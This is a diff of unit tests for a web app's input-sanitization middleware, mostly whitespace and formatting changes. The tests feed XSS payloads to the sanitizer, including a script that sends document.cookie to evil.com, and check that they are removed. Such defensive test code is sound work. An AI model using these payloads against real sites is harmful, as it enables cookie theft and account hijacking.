@@ -7,7 +7,7 @@ describe('Security Middleware Unit Tests', () => {
       it('should sanitize basic XSS attempts', () => {
         const maliciousInput = '<script>alert("xss")</script>Hello World';
         const sanitized = inputSanitizationUtils.sanitizeXSS(maliciousInput);
-        
+
         expect(sanitized).not.toContain('<script>');
         expect(sanitized).not.toContain('alert');
         expect(sanitized).toContain('Hello World');
@@ -16,7 +16,7 @@ describe('Security Middleware Unit Tests', () => {
       it('should sanitize javascript: URLs', () => {
         const maliciousInput = 'javascript:alert("xss")';
         const sanitized = inputSanitizationUtils.sanitizeXSS(maliciousInput);
-        
+
         expect(sanitized).not.toContain('javascript:');
         expect(sanitized).not.toContain('alert');
       });
@@ -24,7 +24,7 @@ describe('Security Middleware Unit Tests', () => {
       it('should sanitize event handlers', () => {
         const maliciousInput = '<img src="x" onerror="alert(1)">';
         const sanitized = inputSanitizationUtils.sanitizeXSS(maliciousInput);
-        
+
         expect(sanitized).not.toContain('onerror=');
         expect(sanitized).not.toContain('alert');
       });
@@ -32,7 +32,7 @@ describe('Security Middleware Unit Tests', () => {
       it('should preserve safe content', () => {
         const safeInput = 'Hello World! This is safe content.';
         const sanitized = inputSanitizationUtils.sanitizeXSS(safeInput);
-        
+
         expect(sanitized).toBe('Hello World! This is safe content.');
       });
     });
@@ -145,7 +145,7 @@ describe('Security Middleware Unit Tests', () => {
 
         dangerousNames.forEach(name => {
           const sanitized = inputSanitizationUtils.sanitizeFileName(name);
-          
+
           expect(sanitized).not.toContain('../');
           expect(sanitized).not.toContain('<script>');
           expect(sanitized).not.toContain('|');
@@ -154,12 +154,7 @@ describe('Security Middleware Unit Tests', () => {
       });
 
       it('should preserve safe file names', () => {
-        const safeNames = [
-          'document.pdf',
-          'report_2023.xlsx',
-          'image-final.jpg',
-          'data.123.csv',
-        ];
+        const safeNames = ['document.pdf', 'report_2023.xlsx', 'image-final.jpg', 'data.123.csv'];
 
         safeNames.forEach(name => {
           const sanitized = inputSanitizationUtils.sanitizeFileName(name);
@@ -170,7 +165,7 @@ describe('Security Middleware Unit Tests', () => {
       it('should limit file name length', () => {
         const longName = 'a'.repeat(300) + '.txt';
         const sanitized = inputSanitizationUtils.sanitizeFileName(longName);
-        
+
         expect(sanitized.length).toBeLessThanOrEqual(255);
       });
     });
@@ -190,7 +185,7 @@ describe('Security Middleware Unit Tests', () => {
 
       xssPatterns.forEach(pattern => {
         const sanitized = inputSanitizationUtils.sanitizeXSS(pattern);
-        
+
         // Should not contain dangerous elements
         expect(sanitized).not.toContain('<script>');
         expect(sanitized).not.toContain('javascript:');
@@ -208,9 +203,9 @@ describe('Security Middleware Unit Tests', () => {
         img.src = 'https://evil.com/steal?' + document.cookie;
         document.body.appendChild(img);
       </script>`;
-      
+
       const sanitized = inputSanitizationUtils.sanitizeXSS(complexInput);
-      
+
       expect(sanitized).not.toContain('<script>');
       expect(sanitized).not.toContain('document.cookie');
       expect(sanitized).not.toContain('appendChild');
@@ -219,7 +214,7 @@ describe('Security Middleware Unit Tests', () => {
     it('should handle mixed content with safe and unsafe elements', () => {
       const mixedInput = 'Hello <script>alert("xss")</script> World <p>Safe content</p>';
       const sanitized = inputSanitizationUtils.sanitizeXSS(mixedInput);
-      
+
       expect(sanitized).toContain('Hello');
       expect(sanitized).toContain('World');
       expect(sanitized).not.toContain('<script>');
